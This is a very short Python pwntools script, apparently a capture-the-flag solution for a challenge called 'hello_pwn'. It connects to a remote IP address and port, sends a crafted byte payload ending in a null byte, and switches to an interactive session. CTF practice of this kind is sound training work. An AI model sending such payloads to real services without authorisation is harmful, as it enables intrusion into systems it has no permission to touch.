from pwn import *
# p=process("./hello_pwn")
p=remote('61.147.171.105',59996)
p.send(b'nnnnaaun\x00')
p.interactive()